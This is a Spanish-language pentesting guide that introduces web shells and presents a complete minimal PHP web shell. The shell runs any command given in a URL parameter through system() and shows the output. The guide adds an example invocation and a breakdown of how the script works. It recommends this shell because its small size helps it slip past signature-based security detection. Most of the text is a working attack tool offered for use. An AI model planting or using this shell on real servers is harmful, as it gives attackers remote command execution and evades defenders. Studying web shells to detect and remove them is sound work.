### **Web Shells para Ejecución de Código Remoto (RCE)**

Una **web shell** es un script que, una vez subido a un servidor web, permite a un atacante ejecutar comandos de sistema de forma remota. Es una de las herramientas de post-explotación más comunes tras descubrir una vulnerabilidad de subida de archivos (File Upload).

Este documento recopila diferentes tipos de web shells, desde las más minimalistas hasta las más completas, para su uso en entornos de pentesting.

-----

### **Web Shell Minimalista en PHP**

Esta es una de las web shells más efectivas debido a su simplicidad. Su pequeño tamaño y funcionalidad directa la hacen difícil de detectar por sistemas de seguridad basados en firmas, a la vez que proporciona todo lo necesario para obtener una ejecución de comandos remota (RCE) en el servidor.

#### **Código de la Web Shell**

```php
<html>
<body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
        <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
        <input type="SUBMIT" value="Execute">
    </form>
    <pre>
    <?php
        if(isset($_GET['cmd']))
        {
            system($_GET['cmd'] . ' 2>&1');
        }
    ?>
    </pre>
</body>
</html>
```

#### **Análisis Técnico y Funcionalidades Clave**

  * **Interfaz de Usuario**:

      * Utiliza el método `GET`, permitiendo ejecutar comandos directamente desde la URL (ej: `http://<IP_servidor>/shell.php?cmd=whoami`).
      * El atributo `autofocus` en el campo de texto mejora la usabilidad.

  * **Motor de Ejecución**:

      * `system()`: Ejecuta el comando y muestra la salida. Es una de las formas más directas de interactuar con el sistema operativo.
      * `2>&1`: Redirecciona la salida de error (`stderr`) a la salida estándar (`stdout`), asegurando que tanto los resultados como los errores de los comandos sean visibles.

  * **Visualización de la Salida**:

      * La etiqueta `<pre>` formatea la salida para que sea legible, respetando los saltos de línea y espacios, simulando una terminal.